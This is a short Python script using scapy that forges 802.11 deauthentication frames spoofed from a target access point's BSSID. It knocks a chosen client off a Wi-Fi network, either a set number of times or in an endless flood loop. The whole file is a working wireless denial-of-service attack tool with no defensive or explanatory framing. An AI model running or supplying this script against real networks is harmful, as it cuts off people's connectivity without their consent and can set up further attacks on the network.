import argparse
from scapy.all import *

def parse_args():
    parser = argparse.ArgumentParser()

    # parser.add_argument("-i",
                        # "--interface",
                        # required=True,
                        # help="Wireless interface to use"
                        # )
    parser.add_argument("-b",
                        "--bssid",
                        required=True,
                        help="BSSID of target AP"
                        )
    parser.add_argument("-c",
                        "--client",
                        required=True,
                        help="MAC address of the client to kick of the AP"
                        )

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--count",
                        default=1,
                        type=int,
                        help="Number of Deauth packets to send"
                        )
    group.add_argument("-f",
                        "--flood",
                        action="store_true",
                        help="Flood Deauth packets"
                        )

    return parser.parse_args()

def sendDeauth():
    print args.bssid
    # Type=0 -> Management frame
    # Subtype 12 -> Deauth management frame
    sendp(RadioTap()/Dot11(type=0, subtype=12, addr1=args.client, addr2=args.bssid, addr3=args.bssid)/Dot11Deauth(reason=7))

if  __name__ == "__main__":
    args = parse_args()
    if args.count <= 0:
        args.count = 1

    print args
    if args.flood:
        while 1:
            sendDeauth()
    else:
       for i in range(0, args.count):
            sendDeauth()
